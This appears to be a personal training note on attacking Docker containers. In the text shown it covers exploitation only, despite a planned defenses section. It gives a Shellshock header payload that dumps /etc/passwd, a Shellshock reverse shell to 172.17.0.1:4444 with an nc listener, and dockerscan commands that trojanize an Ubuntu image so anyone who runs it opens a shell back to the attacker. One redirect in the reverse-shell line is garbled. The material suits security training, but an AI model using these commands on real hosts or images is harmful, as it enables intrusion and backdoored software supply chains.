# Hacking and Securing Docker Containers v2.0


Some of the notes that is specially outside from the [general notes](../Notes.md). 

Things that we will be looking at are:
- Introduction to Docker
- Docker fundamentals
- Attacks against docker environments
- Automated Assessments
- Defenses

---

## Hacking Docker Containers
### Docker Attack Surface
- External attackers using API
- Malicious insiders
- Compromised container (modified image)

### Exploting vulnerable images
This image has the vulnerability of a shellshock, affected many services (http, smtp, ssh)
[Image link](https://hub.docker.com/r/vulnerables/cve-2014-6271)
```bash
docker run --rm -it -p 8080:80 vulnerables/cve-2014-6271
```

Curl the command line to get the list of the password
```bash
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://localhost:8080/cgi-bin/vulnerable
```

Curl the command line below to do a interative accessing the container
```bash
# Terminal 1
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 @>&l'" http://localhost:8080/cgi-bin/vulnerable

# Terminal 2: You can access data in the docker container
nc -nlvp 4444

```
Why 172.17.0.1? Use `ipconfig docker0` to get the ip address from the inet

### Backdooring docker images
```bash
git clone https://github.com/cr0hn/dockerscan.git
sudo python3.8 setup.py install

# Verify dockerscan is installed
dockerscan

# Change directory to backdoor and remove everything
cd ..
cd backdoor
rm -rf *

# Pull the latest ubuntu image and save it as a new tar image
docker pull ubuntu:latest && docker save ubuntu:latest -o ubuntu-original

# Setting some environment variable
export LC_ALL=C.UTF-8
export LANG=C.UTF-8

# Finding the ip address to be used for backdooring
ipconfig docker0
### inet 172.17.0.1 <---- this ip address is the one we will be using

# Modifying the image
dockerscan image modify trojanize ubuntu-original -l 172.17.0.1 -p 4444 -o ubuntu-original-trojanized

# Terminal 1: To receive the reversed shell, and use the interative
nc -v -k -l 172.17.0.1 4444

# When someone pull your image
docker load -i ubuntu-original-trojanized.tar
docker run -it ubuntu:latest bash

# You can access it from Terminal 1
```
